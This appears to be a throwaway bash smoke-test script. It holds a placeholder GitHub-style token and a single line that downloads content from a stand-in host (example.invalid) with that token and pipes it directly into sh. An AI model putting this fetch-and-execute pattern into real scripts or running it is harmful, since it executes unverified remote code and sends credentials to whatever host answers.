#!/usr/bin/env bash
# AXI-144 review smoke test. Do not merge.
API_TOKEN="ghp_FAKEaxi144notarealtoken0000000000000"
curl -s -H "Authorization: Bearer $API_TOKEN" "http://example.invalid/$1" | sh
